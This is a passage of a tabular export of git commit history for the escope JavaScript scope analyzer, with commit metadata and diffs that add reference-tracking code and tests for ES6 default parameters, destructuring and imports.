'module'<\n>+        verify ast<c> 'ImportDeclaration'<c> [<\n>+            []<\n>+            ['a']<\n>+            ['b'<c> 'c'<c> 'd']<\n>+        ]<\n>+    it 'should get variables that declared on `ImportSpecifier`'<c> -><\n>+        ast = espree """"""<\n>+        import ""aaa"";<\n>+        import * as a from ""bbb"";<\n>+        import b<c> {c<c> x as d} from ""ccc"";<\n>+        """"""<c> sourceType: 'module'<\n>+        verify ast<c> 'ImportSpecifier'<c> [<\n>+            ['c']<\n>+            ['d']<\n>+        ]<\n>+    it 'should get variables that declared on `ImportDefaultSpecifier`'<c> -><\n>+        ast = espree """"""<\n>+        import ""aaa"";<\n>+        import * as a from ""bbb"";<\n>+        import b<c> {c<c> x as d} from ""ccc"";<\n>+        """"""<c> sourceType: 'module'<\n>+        verify ast<c> 'ImportDefaultSpecifier'<c> [<\n>+            ['b']<\n>+        ]<\n>+    it 'should get variables that declared on `ImportNamespaceSpecifier`'<c> -><\n>+        ast = espree """"""<\n>+        import ""aaa"";<\n>+        import * as a from ""bbb"";<\n>+        import b<c> {c<c> x as d} from ""ccc"";<\n>+        """"""<c> sourceType: 'module'<\n>+        verify ast<c> 'ImportNamespaceSpecifier'<c> [<\n>+            ['a']<\n>+        ]<\n>+# vim: set sw=4 ts=4 et tw=80 :<\n>",,F
17,56,56,569,4,26,Yusuke Suzuki,114,405,619,197,User,0,4042,Fri,23,3,29 May 2015,Bumps package version,0,0,1,2,46,"+  ""version"": ""3.1.0""<c><\n>","-  ""version"": ""3.0.1""<c><\n>",F
17,56,56,569,4,26,Yusuke Suzuki,114,405,619,197,User,0,4042,Fri,23,0,29 May 2015,Fix repository URL,0,0,1,2,103,"+    ""url"": ""https://github.com/estools/escope.git""<\n>","-    ""url"": ""http://github.com/estools/escope.git""<\n>",F
17,56,56,569,4,26,Michael Ficarra,144,80,823,153,User,1,3432,Wed,18,56,20 May 2015,Merge pull request #66 from pdehaan/patch-1 Update license attribute,0,0,0,0,0,,,F
17,56,56,569,4,26,Peter deHaan,1178,28,74,11,User,1,3131,Wed,17,28,20 May 2015,Updating license to BSD-2-Clause,0,0,1,2,51,"+  ""license"": ""BSD-2-Clause""<c><\n>","-  ""license"": ""BSD""<c><\n>",F
17,56,56,569,4,26,Peter deHaan,1178,28,74,11,User,1,3131,Wed,17,21,20 May 2015,Update license attribute specifying the type and URL is deprecated: https://docs.npmjs.com/files/package.json#license http://npm1k.org/,0,0,1,9,259,"+  ""homepage"": ""http://github.com/estools/escope""<c><\n>+  ""license"": ""BSD""<c><\n>","-  ""homepage"": ""http://github.com/estools/escope.html""<c><\n>-  ""licenses"": [<\n>-    {<\n>-      ""type"": ""BSD""<c><\n>-      ""url"": ""http://github.com/estools/escope/raw/master/LICENSE.BSD""<\n>-    }<\n>-  ]<c><\n>",F
17,56,56,569,4,26,Yusuke Suzuki,114,405,619,197,User,0,4042,Tue,0,42,19 May 2015,Merge pull request #65 from mysticatea/add-references-of-initializers Add references of default parameters and default values of destructuring,0,0,0,0,0,,,F
17,56,56,569,4,26,Toru Nagashima,103,3,460,33,User,0,2574,Mon,18,8,18 May 2015,Remove redundant try-finally,0,0,1,25,779,+        this.visit(pattern.left);<\n>+        this.rightHandNodes.push(pattern.right);<\n>+        this.assignments.pop();<\n>+        this.visit(pattern.argument);<\n>+        this.restElements.pop();<\n>+        this.visit(node.left);<\n>+        this.rightHandNodes.push(node.right);<\n>+        this.assignments.pop();<\n>,-        try {<\n>-            this.visit(pattern.left);<\n>-            this.rightHandNodes.push(pattern.right);<\n>-        } finally {<\n>-            this.assignments.pop();<\n>-        }<\n>-        try {<\n>-            this.visit(pattern.argument);<\n>-        } finally {<\n>-            this.restElements.pop();<\n>-        }<\n>-        try {<\n>-            this.visit(node.left);<\n>-            this.rightHandNodes.push(node.right);<\n>-        } finally {<\n>-            this.assignments.pop();<\n>-        }<\n>,F
17,56,56,569,4,26,Toru Nagashima,103,3,460,33,User,0,2574,Sun,2,58,17 May 2015,Add init property to Reference.,0,0,4,137,7588,"+    constructor(ident<c> scope<c> flag<c>  writeExpr<c> maybeImplicitGlobal<c> partial<c> init) {<\n>+            /**<\n>+             * Whether the Reference is to write of initialization.<\n>+             * @member {boolean} Reference#init<\n>+             */<\n>+            this.init = init;<\n>+            this.currentScope().__referencing(pattern<c> Reference.WRITE<c> node.right<c> null<c> true<c> true);<\n>+    referencingDefaultValue(pattern<c> assignments<c> maybeImplicitGlobal<c> init) {<\n>+                pattern !== assignment.left<c><\n>+                init);<\n>+        // Process parameter declarations.<\n>+                this.referencingDefaultValue(pattern<c> info.assignments<c> null<c> true);<\n>+                    this.currentScope().__referencing(pattern<c> Reference.WRITE<c> node.right<c> null<c> true<c> true);<\n>+                    this.referencingDefaultValue(pattern<c> info.assignments<c> maybeImplicitGlobal<c> false);<\n>+                    this.currentScope().__referencing(pattern<c> Reference.WRITE<c> node.right<c> maybeImplicitGlobal<c> true<c> false);<\n>+                this.referencingDefaultValue(pattern<c> info.assignments<c> null<c> true);<\n>+                this.currentScope().__referencing(pattern<c> Reference.WRITE<c> init<c> null<c> !info.topLevel<c> true);<\n>+                    this.referencingDefaultValue(pattern<c> info.assignments<c> maybeImplicitGlobal<c> false);<\n>+                    this.currentScope().__referencing(pattern<c> Reference.WRITE<c> node.right<c> maybeImplicitGlobal<c> !info.topLevel<c> false);<\n>+            this.referencingDefaultValue(pattern<c> info.assignments<c> null<c> true);<\n>+    __referencing(node<c> assign<c> writeExpr<c> maybeImplicitGlobal<c> partial<c> init) {<\n>+        let ref = new Reference(node<c> this<c> assign || Reference.READ<c> writeExpr<c> maybeImplicitGlobal<c> !!partial<c> !!init);<\n>+    describe 'Reference.init should be a boolean value of whether it is one to initialize or not.'<c> -><\n>+        trueCodes = [<\n>+            'var a = 0;'<\n>+            'let a = 0;'<\n>+            'const a = 0;'<\n>+            'var [a] = [];'<\n>+            'let [a] = [];'<\n>+            'const [a] = [];'<\n>+            'var [a = 1] = [];'<\n>+            'let [a = 1] = [];'<\n>+            'const [a = 1] = [];'<\n>+            'var {a} = {};'<\n>+            'let {a} = {};'<\n>+            'const {a} = {};'<\n>+            'var {b: a} = {};'<\n>+            'let {b: a} = {};'<\n>+            'const {b: a} = {};'<\n>+            'var {b: a = 0} = {};'<\n>+            'let {b: a = 0} = {};'<\n>+            'const {b: a = 0} = {};'<\n>+            'for (var a in []);'<\n>+            'for (let a in []);'<\n>+            'for (var [a] in []);'<\n>+            'for (let [a] in []);'<\n>+            'for (var [a = 0] in []);'<\n>+            'for (let [a = 0] in []);'<\n>+            'for (var {a} in []);'<\n>+            'for (let {a} in []);'<\n>+            'for (var {a = 0} in []);'<\n>+            'for (let {a = 0} in []);'<\n>+            'new function(a = 0) {}'<\n>+            'new function([a = 0] = []) {}'<\n>+            'new function({b: a = 0} = {}) {}'<\n>+        ]<\n>+        for code in trueCodes then do (code) -><\n>+            it '""' + code + '""<c> all references should be true.'<c> -><\n>+                ast = espree code<\n>+                scopeManager = escope.analyze ast<c> ecmaVersion: 6<\n>+                expect(scopeManager.scopes).to.be.length.of.at.least 1<\n>+                scope = scopeManager.scopes[scopeManager.scopes.length - 1]<\n>+                expect(scope.variables).to.have.length.of.at.least 1<\n>+                expect(scope.references).to.have.length.of.at.least 1<\n>+                for reference in scope.references<\n>+                    expect(reference.identifier.name).to.equal 'a'<\n>+                    expect(reference.isWrite()).to.be.true<\n>+                    expect(reference.init).to.be.true<\n>+        falseCodes = [<\n>+            'let a; a = 0;'<\n>+            'let a; [a] = [];'<\n>+            'let a; [a = 1] = [];'<\n>+            'let a; ({a}) = {};'<\n>+            'let a; ({b: a}) = {};'<\n>+            'let a; ({b: a = 0}) = {};'<\n>+            'let a; for (a in []);'<\n>+            'let a; for ([a] in []);'<\n>+            'let a; for ([a = 0] in []);'<\n>+            'let a; for ({a} in []);'<\n>+            'let a; for ({a = 0} in []);'<\n>+        ]<\n>+        for code in falseCodes then do (code) -><\n>+            it '""' + code + '""<c> all references should be false.'<c> -><\n>+                ast = espree code<\n>+                scopeManager = escope.analyze ast<c> ecmaVersion: 6<\n>+                expect(scopeManager.scopes).to.be.length.of.at.least 1<\n>+                scope = scopeManager.scopes[scopeManager.scopes.length - 1]<\n>+                expect(scope.variables).to.have.length 1<\n>+                expect(scope.references).to.have.length.of.at.least 1<\n>+                for reference in scope.references<\n>+                    expect(reference.identifier.name).to.equal 'a'<\n>+                    expect(reference.isWrite()).to.be.true<\n>+                    expect(reference.init).to.be.false<\n>+        falseCodes = [<\n>+            'let a; let b = a;'<\n>+            'let a; let [b] = a;'<\n>+            'let a; let [b = a] = [];'<\n>+            'let a; for (var b in a);'<\n>+            'let a; for (var [b = a] in []);'<\n>+            'let a; for (let b in a);'<\n>+            'let a; for (let [b = a] in []);'<\n>+            'let a<c>b; b = a;'<\n>+            'let a<c>b; [b] = a;'<\n>+            'let a<c>b; [b = a] = [];'<\n>+            'let a<c>b; for (b in a);'<\n>+            'let a<c>b; for ([b = a] in []);'<\n>+            'let a; a.foo = 0;'<\n>+            'let a<c>b; b = a.foo;'<\n>+        ]<\n>+        for code in falseCodes then do (code) -><\n>+            it '""' + code + '""<c> readonly references of ""a"" should be undefined.'<c> -><\n>+                ast = espree code<\n>+                scopeManager = escope.analyze ast<c> ecmaVersion: 6<\n>+                expect(scopeManager.scopes).to.be.length.of.at.least 1<\n>+                scope = scopeManager.scopes[0]<\n>+                expect(scope.variables).to.have.length.of.at.least 1<\n>+                expect(scope.variables[0].name).to.equal 'a'<\n>+                references = scope.variables[0].references<\n>+                expect(references).to.have.length.of.at.least 1<\n>+                for reference in references<\n>+                    expect(reference.isRead()).to.be.true<\n>+                    expect(reference.init).to.be.undefined<\n>",-    constructor(ident<c> scope<c> flag<c>  writeExpr<c> maybeImplicitGlobal<c> partial) {<\n>-            this.currentScope().__referencing(pattern<c> Reference.WRITE<c> node.right<c> null<c> true);<\n>-    referencingDefaultValue(pattern<c> assignments<c> maybeImplicitGlobal = null) {<\n>-                pattern !== assignment.left);<\n>-                this.referencingDefaultValue(pattern<c> info.assignments);<\n>-                    this.currentScope().__referencing(pattern<c> Reference.WRITE<c> node.right<c> null<c> true);<\n>-                    this.referencingDefaultValue(pattern<c> info.assignments<c> maybeImplicitGlobal);<\n>-                    this.currentScope().__referencing(pattern<c> Reference.WRITE<c> node.right<c> maybeImplicitGlobal<c> true);<\n>-                this.referencingDefaultValue(pattern<c> info.assignments);<\n>-                this.currentScope().__referencing(pattern<c> Reference.WRITE<c> init<c> null<c> !info.topLevel);<\n>-                    this.referencingDefaultValue(pattern<c> info.assignments<c> maybeImplicitGlobal);<\n>-                    this.currentScope().__referencing(pattern<c> Reference.WRITE<c> node.right<c> maybeImplicitGlobal<c> !info.topLevel);<\n>-            this.referencingDefaultValue(pattern<c> info.assignments);<\n>-    __referencing(node<c> assign<c> writeExpr<c> maybeImplicitGlobal<c> partial) {<\n>-        let ref = new Reference(node<c> this<c> assign || Reference.READ<c> writeExpr<c> maybeImplicitGlobal<c> !!partial);<\n>,F
17,56,56,569,4,26,Toru Nagashima,103,3,460,33,User,0,2574,Sun,16,31,10 May 2015,Add references of default parameters and default values of destructuring - I changed PatternVisitor to collect right-hand nodes (readonly subtrees). At Referencer.visitPatterns last visits the right-hand nodes recursively. This logic adds readable references for identifiers in default values. - Referencer.referencingDefaultValue adds writable references for parameters/variables that has its default value. Its similar to VariableDeclarator.init. - Because there are calling visitPattern twice for same nodes I added options (processing right-hand nodes or not) to visitPattern.,0,1,5,906,45684,"+    ""espree"": ""^2.0.2""<c><\n>+    constructor(rootPattern<c> callback) {<\n>+        this.rootPattern = rootPattern;<\n>+        this.assignments = [];<\n>+        this.rightHandNodes = [];<\n>+        this.restElements = [];<\n>+        const lastRestElement = getLast(this.restElements);<\n>+        this.callback(pattern<c> {<\n>+            topLevel: pattern === this.rootPattern<c><\n>+            rest: lastRestElement != null && lastRestElement.argument === pattern<c><\n>+            assignments: this.assignments<\n>+        });<\n>+            // Computed property's key is a right hand node.<\n>+            if (property.computed) {<\n>+                this.rightHandNodes.push(property.key);<\n>+            // If it's shorthand<c> its key is same as its value.<\n>+            // If it's shorthand and has its default value<c> its key is same as its value.left (the value is AssignmentPattern).<\n>+            // If it's not shorthand<c> the name of new variable is its value's.<\n>+            this.visit(element);<\n>+        this.assignments.push(pattern);<\n>+        try {<\n>+            this.visit(pattern.left);<\n>+            this.rightHandNodes.push(pattern.right);<\n>+        } finally {<\n>+            this.assignments.pop();<\n>+        }<\n>+    }<\n>+    RestElement(pattern) {<\n>+        this.restElements.push(pattern);<\n>+        try {<\n>+            this.visit(pattern.argument);<\n>+        } finally {<\n>+            this.restElements.pop();<\n>+        }<\n>+    }<\n>+    MemberExpression(node) {<\n>+        // Computed property's key is a right hand node.<\n>+        if (node.computed) {<\n>+            this.rightHandNodes.push(node.property);<\n>+        }<\n>+        // the object is only read<c> write to its property.<\n>+        this.rightHandNodes.push(node.object);<\n>+    }<\n>+    //<\n>+    // ForInStatement.left and AssignmentExpression.left are LeftHandSideExpression.<\n>+    // By spec<c> LeftHandSideExpression is Pattern or MemberExpression.<\n>+    //   (see also: https://github.com/estree/estree/pull/20#issuecomment-74584758)<\n>+    // But espree 2.0 and esprima 2.0 parse to ArrayExpression<c> ObjectExpression<c> etc...<\n>+    //<\n>+    SpreadElement(node) {<\n>+        this.visit(node.argument);<\n>+    }<\n>+    ArrayExpression(node) {<\n>+        node.elements.forEach(this.visit<c> this);<\n>+    ObjectExpression(node) {<\n>+        node.properties.forEach(property => {<\n>+            // Computed property's key is a right hand node.<\n>+            if (property.computed) {<\n>+                this.rightHandNodes.push(property.key);<\n>+            }<\n>+            this.visit(property.value);<\n>+        });<\n>+    }<\n>+    AssignmentExpression(node) {<\n>+        this.assignments.push(node);<\n>+        try {<\n>+            this.visit(node.left);<\n>+            this.rightHandNodes.push(node.right);<\n>+        } finally {<\n>+            this.assignments.pop();<\n>+        }<\n>+    }<\n>+    CallExpression(node) {<\n>+        // arguments are right hand nodes.<\n>+        node.arguments.forEach(a => { this.rightHandNodes.push(a); });<\n>+        this.visit(node.callee);<\n>+    }<\n>+function getLast(xs) {<\n>+    return xs[xs.length - 1] || null;<\n>+    // Call the callback at left hand identifier nodes<c> and Collect right hand nodes.<\n>+    var visitor = new PatternVisitor(rootPattern<c> callback);<\n>+    visitor.visit(rootPattern);<\n>+    // Process the right hand nodes recursively.<\n>+    if (referencer != null) {<\n>+        visitor.rightHandNodes.forEach(referencer.visit<c> referencer);<\n>+    }<\n>+    return (<\n>+        nodeType === Syntax.Identifier ||<\n>+        nodeType === Syntax.ObjectPattern ||<\n>+        nodeType === Syntax.ArrayPattern ||<\n>+        nodeType === Syntax.SpreadElement ||<\n>+        nodeType === Syntax.RestElement ||<\n>+        nodeType === Syntax.AssignmentPattern<\n>+    );<\n>+        this.visitVariableDeclaration(this.currentScope()<c> Variable.TDZ<c> iterationNode.left<c> 0<c> true);<\n>+    referencingDefaultValue(pattern<c> assignments<c> maybeImplicitGlobal = null) {<\n>+        const scope = this.currentScope();<\n>+        assignments.forEach(assignment => {<\n>+            scope.__referencing(<\n>+                pattern<c><\n>+                Reference.WRITE<c><\n>+                assignment.right<c><\n>+                maybeImplicitGlobal<c><\n>+                pattern !== assignment.left);<\n>+        });<\n>+    }<\n>+    visitPattern(node<c> options<c> callback) {<\n>+        if (typeof options === 'function') {<\n>+            callback = options;<\n>+            options = {processRightHandNodes: false}<\n>+        }<\n>+        traverseIdentifierInPattern(<\n>+            node<c><\n>+            options.processRightHandNodes ? this : null<c><\n>+            callback);<\n>+            this.visitPattern(node.params[i]<c> {processRightHandNodes: true}<c> (pattern<c> info) => {<\n>+                        info.rest<\n>+                this.referencingDefaultValue(pattern<c> info.assignments);<\n>+                this.visitPattern(node.left<c> {processRightHandNodes: true}<c> (pattern<c> info) => {<\n>+                    this.referencingDefaultValue(pattern<c> info.assignments<c> maybeImplicitGlobal);<\n>+    visitVariableDeclaration(variableTargetScope<c> type<c> node<c> index<c> fromTDZ) {<\n>+        // If this was called to initialize a TDZ scope<c> this needs to make definitions<c> but doesn't make references.<\n>+        this.visitPattern(decl.id<c> {processRightHandNodes: !fromTDZ}<c> (pattern<c> info) => {<\n>+            if (!fromTDZ) {<\n>+                this.referencingDefaultValue(pattern<c> info.assignments);<\n>+            }<\n>+                this.currentScope().__referencing(pattern<c> Reference.WRITE<c> init<c> null<c> !info.topLevel);<\n>+                this.visitPattern(node.left<c> {processRightHandNodes: true}<c> (pattern<c> info) => {<\n>+                    this.referencingDefaultValue(pattern<c> info.assignments<c> maybeImplicitGlobal);<\n>+                    this.currentScope().__referencing(pattern<c> Reference.WRITE<c> node.right<c> maybeImplicitGlobal<c> !info.topLevel);<\n>+        this.visitPattern(node.param<c> {processRightHandNodes: true}<c> (pattern<c> info) => {<\n>+            this.referencingDefaultValue(pattern<c> info.assignments);<\n>+# -*- coding: utf-8 -*-<\n>+#  Copyright (C) 2015 Toru Nagashima<\n>+#<\n>+#  Redistribution and use in source and binary forms<c> with or without<\n>+#  modification<c> are permitted provided that the following conditions are met:<\n>+#<\n>+#    * Redistributions of source code must retain the above copyright<\n>+#      notice<c> this list of conditions and the following disclaimer.<\n>+#    * Redistributions in binary form must reproduce the above copyright<\n>+#      notice<c> this list of conditions and the following disclaimer in the<\n>+#      documentation and/or other materials provided with the distribution.<\n>+#<\n>+#  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS ""AS IS""<\n>+#  AND ANY EXPRESS OR IMPLIED WARRANTIES<c> INCLUDING<c> BUT NOT LIMITED TO<c> THE<\n>+#  IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE<\n>+#  ARE DISCLAIMED. IN NO EVENT SHALL <COPYRIGHT HOLDER> BE LIABLE FOR ANY<\n>+#  DIRECT<c> INDIRECT<c> INCIDENTAL<c> SPECIAL<c> EXEMPLARY<c> OR CONSEQUENTIAL DAMAGES<\n>+#  (INCLUDING<c> BUT NOT LIMITED TO<c> PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;<\n>+#  LOSS OF USE<c> DATA<c> OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND<\n>+#  ON ANY THEORY OF LIABILITY<c> WHETHER IN CONTRACT<c> STRICT LIABILITY<c> OR TORT<\n>+#  (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF<\n>+#  THIS SOFTWARE<c> EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.<\n>+expect = require('chai').expect<\n>+espree = require '../third_party/espree'<\n>+escope = require '..'<\n>+describe 'ES6 default parameters:'<c> -><\n>+    describe 'a default parameter creates a writable reference for its initialization:'<c> -><\n>+        patterns =<\n>+            FunctionDeclaration: """"""<\n>+                function foo(a<c> b = 0) {}<\n>+            """"""<\n>+            FunctionExpression: """"""<\n>+                let foo = function(a<c> b = 0) {};<\n>+            """"""<\n>+            ArrowExpression: """"""<\n>+                let foo = (a<c> b = 0) => {};<\n>+            """"""<\n>+        for name<c> code of patterns then do (name<c> code) -><\n>+            it name<c> -><\n>+                numVars = if name == 'ArrowExpression' then 2 else 3<\n>+                ast = espree code<\n>+                scopeManager = escope.analyze ast<c> ecmaVersion: 6<\n>+                expect(scopeManager.scopes).to.have.length 2  # [global<c> foo]<\n>+                scope = scopeManager.scopes[1]<\n>+                expect(scope.variables).to.have.length numVars  # [arguments?<c> a<c> b]<\n>+                expect(scope.references).to.have.length 1<\n>+                reference = scope.references[0]<\n>+                expect(reference.from).to.equal scope<\n>+                expect(reference.identifier.name).to.equal 'b'<\n>+                expect(reference.resolved).to.equal scope.variables[numVars - 1]<\n>+                expect(reference.writeExpr).to.not.be.undefined<\n>+                expect(reference.isWrite()).to.be.true<\n>+                expect(reference.isRead()).to.be.false<\n>+    describe 'a default parameter creates a readable reference for references in right:'<c> -><\n>+        patterns =<\n>+            FunctionDeclaration: """"""<\n>+                let a;<\n>+                function foo(b = a) {}<\n>+            """"""<\n>+            FunctionExpression: """"""<\n>+                let a;<\n>+                let foo = function(b = a) {}<\n>+            """"""<\n>+            ArrowExpression: """"""<\n>+                let a;<\n>+                let foo = (b = a) => {};<\n>+            """"""<\n>+        for name<c> code of patterns then do (name<c> code) -><\n>+            it name<c> -><\n>+                numVars = if name == 'ArrowExpression' then 1 else 2<\n>+                ast = espree code<\n>+                scopeManager = escope.analyze ast<c> ecmaVersion: 6<\n>+                expect(scopeManager.scopes).to.have.length 2  # [global<c> foo]<\n>+                scope = scopeManager.scopes[1]<\n>+                expect(scope.variables).to.have.length numVars  # [arguments?<c> b]<\n>+                expect(scope.references).to.have.length 2  # [b<c> a]<\n>+                reference = scope.references[1]<\n>+                expect(reference.from).to.equal scope<\n>+                expect(reference.identifier.name).to.equal 'a'<\n>+                expect(reference.resolved).to.equal scopeManager.scopes[0].variables[0]<\n>+                expect(reference.writeExpr).to.be.undefined<\n>+                expect(reference.isWrite()).to.be.false<\n>+                expect(reference.isRead()).to.be.true<\n>+    describe 'a default parameter creates a readable reference for references in right (for const):'<c> -><\n>+        patterns =<\n>+            FunctionDeclaration: """"""<\n>+                const a = 0;<\n>+                function foo(b = a) {}<\n>+            """"""<\n>+            FunctionExpression: """"""<\n>+                const a = 0;<\n>+                let foo = function(b = a) {}<\n>+            """"""<\n>+            ArrowExpression: """"""<\n>+                const a = 0;<\n>+                let foo = (b = a) => {};<\n>+            """"""<\n>+        for name<c> code of patterns then do (name<c> code) -><\n>+            it name<c> -><\n>+                numVars = if name == 'ArrowExpression' then 1 else 2<\n>+                ast = espree code<\n>+                scopeManager = escope.analyze ast<c> ecmaVersion: 6<\n>+                expect(scopeManager.scopes).to.have.length 2  # [global<c> foo]<\n>+                scope = scopeManager.scopes[1]<\n>+                expect(scope.variables).to.have.length numVars  # [arguments?<c> b]<\n>+                expect(scope.references).to.have.length 2  # [b<c> a]<\n>+                reference = scope.references[1]<\n>+                expect(reference.from).to.equal scope<\n>+                expect(reference.identifier.name).to.equal 'a'<\n>+                expect(reference.resolved).to.equal scopeManager.scopes[0].variables[0]<\n>+                expect(reference.writeExpr).to.be.undefined<\n>+                expect(reference.isWrite()).to.be.false<\n>+                expect(reference.isRead()).to.be.true<\n>+    describe 'a default parameter creates a readable reference for references in right (partial):'<c> -><\n>+        patterns =<\n>+            FunctionDeclaration: """"""<\n>+                let a;<\n>+                function foo(b = a.c) {}<\n>+            """"""<\n>+            FunctionExpression: """"""<\n>+                let a;<\n>+                let foo = function(b = a.c) {}<\n>+            """"""<\n>+            ArrowExpression: """"""<\n>+                let a;<\n>+                let foo = (b = a.c) => {};<\n>+            """"""<\n>+        for name<c> code of patterns then do (name<c> code) -><\n>+            it name<c> -><\n>+                numVars = if name == 'ArrowExpression' then 1 else 2<\n>+                ast = espree code<\n>+                scopeManager = escope.analyze ast<c> ecmaVersion: 6<\n>+                expect(scopeManager.scopes).to.have.length 2  # [global<c> foo]<\n>+                scope = scopeManager.scopes[1]<\n>+                expect(scope.variables).to.have.length numVars  # [arguments?<c> b]<\n>+                expect(scope.references).to.have.length 2  # [b<c> a]<\n>+                reference = scope.references[1]<\n>+                expect(reference.from).to.equal scope<\n>+                expect(reference.identifier.name).to.equal 'a'<\n>+                expect(reference.resolved).to.equal scopeManager.scopes[0].variables[0]<\n>+                expect(reference.writeExpr).to.be.undefined<\n>+                expect(reference.isWrite()).to.be.false<\n>+                expect(reference.isRead()).to.be.true<\n>+    describe 'a default parameter creates a readable reference for references in right\'s nested scope:'<c> -><\n>+        patterns =<\n>+            FunctionDeclaration: """"""<\n>+                let a;<\n>+                function foo(b = function() { return a; }) {}<\n>+            """"""<\n>+            FunctionExpression: """"""<\n>+                let a;<\n>+                let foo = function(b = function() { return a; }) {}<\n>+            """"""<\n>+            ArrowExpression: """"""<\n>+                let a;<\n>+                let foo = (b = function() { return a; }) => {};<\n>+            """"""<\n>+        for name<c> code of patterns then do (name<c> code) -><\n>+            it name<c> -><\n>+                ast = espree code<\n>+                scopeManager = escope.analyze ast<c> ecmaVersion: 6<\n>+                expect(scopeManager.scopes).to.have.length 3  # [global<c> foo<c> anonymous]<\n>+                scope = scopeManager.scopes[2]<\n>+                expect(scope.variables).to.have.length 1  # [arguments]<\n>+                expect(scope.references).to.have.length 1  # [a]<\n>+                reference = scope.references[0]<\n>+                expect(reference.from).to.equal scope<\n>+                expect(reference.identifier.name).to.equal 'a'<\n>+                expect(reference.resolved).to.equal scopeManager.scopes[0].variables[0]<\n>+                expect(reference.writeExpr).to.be.undefined<\n>+                expect(reference.isWrite()).to.be.false<\n>+                expect(reference.isRead()).to.be.true<\n>+# vim: set sw=4 ts=4 et tw=80 :<\n>+    it 'Pattern in let in ForInStatement'<c> -><\n>+        ast = harmony.parse """"""<\n>+        (function () {<\n>+            for (let [a<c> b<c> c] in array);<\n>+        }());<\n>+        """"""<\n>+        scopeManager = escope.analyze ast<c> ecmaVersion: 6<\n>+        expect(scopeManager.scopes).to.have.length 4  # [global<c> function<c> TDZ<c> for]<\n>+        scope = scopeManager.scopes[0]<\n>+        globalScope = scope<\n>+        expect(scope.type).to.equal 'global'<\n>+        expect(scope.variables).to.have.length 0<\n>+        expect(scope.references).to.have.length 0<\n>+        expect(scope.implicit.left).to.have.length 1<\n>+        expect(scope.implicit.left[0].identifier.name).to.equal 'array'<\n>+        scope = scopeManager.scopes[2]<\n>+        expect(scope.type).to.equal 'TDZ'<\n>+        expect(scope.variables).to.have.length 3<\n>+        expect(scope.variables[0].name).to.equal 'a'<\n>+        expect(scope.variables[1].name).to.equal 'b'<\n>+        expect(scope.variables[2].name).to.equal 'c'<\n>+        expect(scope.references).to.have.length 1<\n>+        expect(scope.references[0].identifier.name).to.equal 'array'<\n>+        expect(scope.references[0].isWrite()).to.be.false<\n>+        scope = scopeManager.scopes[3]<\n>+        expect(scope.type).to.equal 'for'<\n>+        expect(scope.variables).to.have.length 3<\n>+        expect(scope.variables[0].name).to.equal 'a'<\n>+        expect(scope.variables[1].name).to.equal 'b'<\n>+        expect(scope.variables[2].name).to.equal 'c'<\n>+        expect(scope.references).to.have.length 3<\n>+        expect(scope.references[0].identifier.name).to.equal 'a'<\n>+        expect(scope.references[0].isWrite()).to.be.true<\n>+        expect(scope.references[0].partial).to.be.true<\n>+        expect(scope.references[0].resolved).to.equal scope.variables[0]<\n>+        expect(scope.references[1].identifier.name).to.equal 'b'<\n>+        expect(scope.references[1].isWrite()).to.be.true<\n>+        expect(scope.references[1].partial).to.be.true<\n>+        expect(scope.references[1].resolved).to.equal scope.variables[1]<\n>+        expect(scope.references[2].identifier.name).to.equal 'c'<\n>+        expect(scope.references[2].isWrite()).to.be.true<\n>+        expect(scope.references[2].partial).to.be.true<\n>+        expect(scope.references[2].resolved).to.equal scope.variables[2]<\n>+    it 'Pattern with default values in var in ForInStatement'<c> -><\n>+        ast = espree """"""<\n>+        (function () {<\n>+            for (var [a<c> b<c> c = d] in array);<\n>+        }());<\n>+        """"""<\n>+        scopeManager = escope.analyze ast<c> ecmaVersion: 6<\n>+        expect(scopeManager.scopes).to.have.length 2<\n>+        scope = scopeManager.scopes[0]<\n>+        globalScope = scope<\n>+        expect(scope.type).to.equal 'global'<\n>+        expect(scope.variables).to.have.length 0<\n>+        expect(scope.references).to.have.length 0<\n>+        expect(scope.implicit.left).to.have.length 2<\n>+        expect(scope.implicit.left[0].identifier.name).to.equal 'd'<\n>+        expect(scope.implicit.left[1].identifier.name).to.equal 'array'<\n>+        scope = scopeManager.scopes[1]<\n>+        expect(scope.type).to.equal 'function'<\n>+        expect(scope.variables).to.have.length 4<\n>+        expect(scope.variables[0].name).to.equal 'arguments'<\n>+        expect(scope.variables[1].name).to.equal 'a'<\n>+        expect(scope.variables[2].name).to.equal 'b'<\n>+        expect(scope.variables[3].name).to.equal 'c'<\n>+        expect(scope.references).to.have.length 6<\n>+        expect(scope.references[0].identifier.name).to.equal 'c'<\n>+        expect(scope.references[0].isWrite()).to.be.true<\n>+        expect(scope.references[0].writeExpr.name).to.equal 'd'<\n>+        expect(scope.references[0].partial).to.be.false<\n>+        expect(scope.references[0].resolved).to.equal scope.variables[3]<\n>+        expect(scope.references[1].identifier.name).to.equal 'd'<\n>+        expect(scope.references[1].isWrite()).to.be.false<\n>+        expect(scope.references[2].identifier.name).to.equal 'a'<\n>+        expect(scope.references[2].isWrite()).to.be.true<\n>+        expect(scope.references[2].partial).to.be.true<\n>+        expect(scope.references[2].resolved).to.equal scope.variables[1]<\n>+        expect(scope.references[3].identifier.name).to.equal 'b'<\n>+        expect(scope.references[3].isWrite()).to.be.true<\n>+        expect(scope.references[3].partial).to.be.true<\n>+        expect(scope.references[3].resolved).to.equal scope.variables[2]<\n>+        expect(scope.references[4].identifier.name).to.equal 'c'<\n>+        expect(scope.references[4].isWrite()).to.be.true<\n>+        expect(scope.references[4].writeExpr.name).to.equal 'array'<\n>+        expect(scope.references[4].partial).to.be.true<\n>+        expect(scope.references[4].resolved).to.equal scope.variables[3]<\n>+        expect(scope.references[5].identifier.name).to.equal 'array'<\n>+        expect(scope.references[5].isWrite()).to.be.false<\n>+    it 'Pattern with default values in let in ForInStatement'<c> -><\n>+        ast = espree """"""<\n>+        (function () {<\n>+            for (let [a<c> b<c> c = d] in array);<\n>+        }());<\n>+        """"""<\n>+        scopeManager = escope.analyze ast<c> ecmaVersion: 6<\n>+        expect(scopeManager.scopes).to.have.length 4  # [global<c> function<c> TDZ<c> for]<\n>+        scope = scopeManager.scopes[0]<\n>+        globalScope = scope<\n>+        expect(scope.type).to.equal 'global'<\n>+        